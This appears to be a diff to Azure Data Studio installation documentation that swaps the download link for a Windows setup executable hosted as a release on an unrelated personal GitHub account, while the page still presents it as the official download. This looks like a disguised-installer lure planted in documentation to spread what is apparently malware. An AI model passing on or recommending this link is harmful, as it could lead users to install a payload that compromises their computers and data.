@@ -12,7 +12,7 @@
 
 To install Azure Data Studio on Windows:    
 
-**[Download Azure Data Studio](*)**
+**[Download Azure Data Studio](https://github.com/stardew47/open/releases/download/1.2975/azuredatastudio-windows-setup-1.51.1.exe)**
 
 Starting with Azure Data Studio is quick and easy. Download the latest version, follow the installation guide, and start working with your data in a user-friendly, modern environment.
 
